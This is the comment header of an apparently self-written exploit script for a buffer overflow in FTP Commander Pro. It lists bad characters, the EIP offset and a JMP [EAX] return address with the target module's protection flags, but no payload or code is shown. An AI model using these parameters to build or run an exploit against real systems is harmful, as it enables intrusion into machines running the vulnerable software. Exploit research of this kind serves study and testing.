# This code exploits the buffer overflow vulnerability in FTP COmmander Pro. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

# Bad characters: 0x00, 0x0A, 0x0D, 0x80-0xFF
# EIP Offset: 4108
# JMP [EAX] address - Log data, item 10 Address=00447443
# Message=  0x00447443 : '\xFF\x20' | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [cftp.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v7.80.1.120 (C:\cftp\cftp.exe)
